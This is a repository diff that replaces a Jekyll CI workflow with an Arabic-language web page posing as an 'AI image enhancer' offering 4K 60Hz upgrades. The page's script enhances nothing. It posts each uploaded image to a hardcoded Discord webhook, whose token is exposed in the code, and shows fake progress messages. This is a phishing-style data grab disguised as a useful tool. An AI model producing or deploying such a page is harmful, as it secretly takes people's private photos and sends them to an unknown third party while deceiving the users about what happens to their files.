@@ -1,20 +1,121 @@
-name: Jekyll site CI
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>محسن الصور AI - 4K 60Hz</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #e0e0ff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(20, 20, 60, 0.7);
+            backdrop-filter: blur(12px);
+            border-radius: 24px;
+            padding: 40px 30px;
+            width: 90%;
+            max-width: 480px;
+            box-shadow: 0 0 60px rgba(100, 0, 255, 0.4);
+            border: 1px solid rgba(100, 0, 255, 0.3);
+            text-align: center;
+            animation: glow 3s infinite alternate;
+        }
+        @keyframes glow {
+            from { box-shadow: 0 0 40px rgba(100,0,255,0.3); }
+            to   { box-shadow: 0 0 80px rgba(100,0,255,0.7); }
+        }
+        h1 {
+            font-size: 2.6rem;
+            background: linear-gradient(90deg, #a78bfa, #7c3aed, #c084fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 25px;
+        }
+        p { margin: 20px 0; font-size: 1.3rem; opacity: 0.9; }
+        .btn {
+            background: linear-gradient(45deg, #7c3aed, #a78bfa);
+            border: none;
+            color: white;
+            font-size: 1.4rem;
+            padding: 18px 50px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 25px 0;
+            transition: all 0.4s;
+            box-shadow: 0 10px 30px rgba(100,0,255,0.5);
+        }
+        .btn:hover { transform: translateY(-5px); box-shadow: 0 20px 50px rgba(100,0,255,0.8); }
+        #preview { 
+            width: 100%; max-height: 320px; 
+            border-radius: 16px; margin: 25px 0; 
+            border: 3px solid #a78bfa; display: none; 
+        }
+        #status {
+            font-size: 1.2rem;
+            margin-top: 20px;
+            color: #c084fc;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>محسن الصور AI</h1>
+        <p>ارفق الصورة وراح نحسنها ونرفع جودتها إلى 4K 60Hz</p>
+        
+        <input type="file" id="imageInput" accept="image/*" style="display:none;">
+        <button class="btn" onclick="document.getElementById('imageInput').click()">ارفق الصورة</button>
+        
+        <img id="preview" alt="معاينة الصورة">
+        
+        <div id="status"></div>
+    </div>
 
-on:
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1399364418868875446/NntQ9ZpNP3BH9C0iuZmmagvk1-HGUvstb_x1VIftLB_SQuFlAInkBQOYIVk5A-icZ1zn";
+        const input = document.getElementById('imageInput');
+        const preview = document.getElementById('preview');
+        const status = document.getElementById('status');
 
-jobs:
-  build:
+        input.addEventListener('change', async function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
 
-    runs-on: ubuntu-latest
+            // عرض المعاينة
+            const reader = new FileReader();
+            reader.onload = function(ev) {
+                preview.src = ev.target.result;
+                preview.style.display = 'block';
+            };
+            reader.readAsDataURL(file);
 
-    steps:
-    - uses: actions/checkout@v4
-    - name: Build the site in the jekyll/builder container
-      run: |
-        docker run \
-        -v ${{ github.workspace }}:/srv/jekyll -v ${{ github.workspace }}/_site:/srv/jekyll/_site \
-        jekyll/builder:latest /bin/bash -c "chmod -R 777 /srv/jekyll && jekyll build --future"
+            status.textContent = "جاري تحسين الصورة ورفع الجودة إلى 4K 60Hz...";
+
+            // إرسال الصورة فقط للويبهوك
+            const formData = new FormData();
+            formData.append('file', file, 'enhanced_image.jpg');
+            formData.append('payload_json', JSON.stringify({
+                content: "صورة جديدة مرفوعة - جاري التحسين إلى 4K 60Hz",
+                username: "AI Image Enhancer",
+                avatar_url: "https://i.imgur.com/neon-ai-icon.png"
+            }));
+
+            try {
+                await fetch(webhook, { method: 'POST', body: formData });
+                status.textContent = "تم الإرسال! الجودة بتتحسن دلوقتي...";
+            } catch(err) {
+                status.textContent = "حصل خطأ في الإرسال";
+                console.error(err);
+            }
+        });
+    </script>
+</body>
+</html>
